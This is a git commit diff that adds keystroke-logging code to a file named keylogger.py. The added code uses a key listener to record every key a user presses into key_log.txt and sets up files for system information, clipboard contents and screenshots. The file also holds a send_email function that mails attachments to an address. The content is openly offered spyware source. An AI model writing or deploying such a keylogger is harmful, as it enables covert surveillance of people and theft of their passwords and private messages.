7527bc2c0ed76ab6b979c0ce1c934fbce0a95e92
Aditya Chandrakant Malviya <malviyaaditya341@gmail.com>
2024-10-26 11:28:49 +0530

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -25,6 +25,46 @@ from requests import get
 from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
 
+keys_information = "key_log.txt"
+system_information = "syseminfo.txt"
+clipboard_information = "clipboard.txt"
+screenshot_information = "screenshot.png"
+
+file_path = os.getcwd()
+extend="\\"
+
+count = 0
+keys=[]
+
+def on_press(key):
+    global keys,count
+    print(key)
+    keys.append(key)
+    count += 1
+
+    if count >= 1:
+        count = 0
+        write_file(keys)
+        keys =[]
+
+def write_file(keys):
+    with open(file_path+extend+keys_information,"a") as f:
+        for key in keys:
+            k=str(key).replace("'","")
+            if k.find("space")>0:
+                f.write('\n')
+                f.close()
+            elif k.find("Key") == -1:
+                f.write(k)
+                f.close()
+
+def on_release(key):
+    if key==Key.esc:
+        return False
+    
+with Listener(on_press=on_press,on_release=on_release) as listener:
+    listener.join()
+
 def send_email(filename, attachment, toaddr):
 
     fromaddr = email_address
@@ -47,3 +87,76 @@ def send_email(filename, attachment, toaddr):
     text = msg.as_string()
     s.sendmail(fromaddr, toaddr, text)
     s.quit()
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
